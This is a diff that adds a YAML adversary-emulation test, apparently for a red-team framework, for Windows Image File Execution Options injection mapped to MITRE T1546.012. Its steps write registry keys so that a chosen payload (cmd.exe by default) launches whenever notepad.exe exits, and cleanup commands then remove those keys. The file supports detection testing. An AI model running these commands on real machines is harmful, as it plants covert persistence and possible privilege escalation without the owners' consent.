@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: IFEO Global Flags
+description: |
+    Leverage Global Flags Settings
+args:
+    - name: target_binary
+      type: path
+      default: notepad.exe
+    - name: payload_binary
+      type: path
+      default: C:\Windows\System32\cmd.exe
+uuid: 46b1f278-c8ee-4aa5-acce-65e77b11f3c1
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.012: Image File Execution Options Injection'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: ifeo-global-flags
+      inline: |
+        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v GlobalFlag /t REG_DWORD /d 512
+        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v ReportingMode /t REG_DWORD /d 1
+        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v MonitorProcess /d "{{.Args.payload_binary}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v GlobalFlag /f >nul 2>&1
+            reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v ReportingMode /f >nul 2>&1
+            reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{{.Args.target_binary}}" /v MonitorProcess /f >nul 2>&1
+        executor: command_prompt
